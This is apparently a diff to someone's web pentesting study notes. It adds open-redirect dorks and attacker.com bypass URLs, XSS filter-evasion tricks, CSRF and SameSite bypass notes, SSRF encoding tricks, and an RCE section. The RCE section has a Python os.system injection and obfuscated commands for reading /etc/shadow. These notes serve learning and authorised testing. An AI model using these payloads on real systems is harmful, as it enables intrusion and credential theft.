@@ -6,6 +6,45 @@ testing start
 
 unvalidate redirect  
 
+                                                  
+                                                  open redirect 
+                                                  
+                                                  use google dorks 
+                                                  
+                                                  
+                                                  inurl:%3Dhttp site:example.com
+                                                  
+                                                  inurl:%3D%2F site:example.com
+                                                  
+                                                  inurl:redir site:example.com
+                                                  inurl:redirect site:example.com
+                                                  Open Redirects   135
+                                                  inurl:redirecturi site:example.com
+                                                  inurl:redirect_uri site:example.com
+                                                  inurl:redirecturl site:example.com
+                                                  inurl:redirect_uri site:example.com
+                                                  inurl:return site:example.com
+                                                  inurl:returnurl site:example.com
+                                                  inurl:relaystate site:example.com
+                                                  inurl:forward site:example.com
+                                                  inurl:forwardurl site:example.com
+                                                  inurl:forward_url site:example.com
+                                                  inurl:url site:example.com
+                                                  inurl:uri site:example.com
+                                                  inurl:dest site:example.com
+                                                  inurl:destination site:example.com
+                                                  inurl:next site:exampl
+                                                  
+                                                  Bypass validation
+                                                  
+                                                  https://example.com/login?redir=http://example.com.attacker.com
+                                                  https://example.com/login?redir=http://attacker.com/example.com
+                                                  
+                                                  Double Encoding
+                                                  
+                                                  First, try to double- or triple-URL-encode certain special characters in your
+                                                  payload. For example, you could URL-encode the slash character in https://
+                                                  example.com/@attacker.com. Here is the URL with a URL-encoded slash:
 
 
 IDOR
@@ -197,14 +236,24 @@ direct access to url like /Admin
 
 
 
-
-
-
                                                                     Client side template injection
                                                                     dangling markup
 
 
                                                                   https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
+
+                                                  xss bypass
+                                                  
+                                                  instead of <script> use alternative like img or javascript:alert
+                                                  
+                                                  
+                                                  captilization and encoding
+                                                  
+                                                  ScrIpT
+                                                  base64 encode utf-8 or unicode 
+                                                  
+                                                  Use script twice <script><script>alert(1)</script>
+
 
 
                             
@@ -331,7 +380,43 @@ direct access to url like /Admin
 
                                                             some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state: 
 
-
+                                                    
+                                                      
+                                                      samesite : strict or lax - csrf not possible - it wont send cookie for cross site request - top level navigation
+                                                      
+                                                      but still possible it state change happens using GET method
+                                                      
+                                                      https://email.example.com/password_change?new_password=abc123.
+                                                      
+                                                      
+                                                      you might explicitly set SameSite on a session cookie to None, allowing the sending of the cookie
+                                                      across origins, so traditional CSRF attacks would still work.
+                                                      
+                                                      
+                                                      delete the token
+                                                      
+                                                      use random token
+                                                      
+                                                      use pool token
+                                                      
+                                                      
+                                                      double submit cookie - bypass - session fixation
+                                                      
+                                                      Sites also commonly use a double-submit cookie as a defense against CSRF. In
+                                                      this technique, the state-changing request contains the same random token
+                                                      as both a cookie and a request parameter, and the server checks whether
+                                                      the two values are equal. 
+                                                      
+                                                      POST /password_change
+                                                      Host: email.example.com
+                                                      Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b
+                                                      (POST request body)
+                                                      new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
+                                                      
+                                                      
+                                                      
+                                                      
+                                                      csrf + xss
 
 
 
@@ -506,6 +591,11 @@ direct access to url like /Admin
                                                               header("Location: http://localhost:25");
                                                               ?>
 
+                                               ssrf bypass                 
+                                                                octal encoding
+                                                                hex encoding
+                                                                decimal representation
+
 
                             23. XXE 
 
@@ -587,6 +677,11 @@ direct access to url like /Admin
 
                                                         2FA - directly access /my-account 
                                                         Cookie: account=carlos
+                                                        auth bypass
+                                                        
+                                                        directly access the /home endpoint without /login page
+                                                        
+
 
                                                         OAUTH
 
@@ -1413,6 +1508,26 @@ check hacktricks
 
 
                                                         ../../../../../
+
+
+
+                          35. RCE
+
+                                                    GET /calculator?calc="__import__('os').system('ls')"
+                                                    sleep
+                                                    username
+                                                    
+                                                    
+                                                    bypass
+                                                    
+                                                    cat /etc/shadow
+                                                    cat "/e"tc'/shadow'
+                                                    cat /etc/sh*dow
+                                                    cat /etc/sha``dow
+                                                    cat /etc/sha$()dow
+                                                    cat /etc/sha${}dow
+                                                    
+                                                    refer vikile
 
 
 
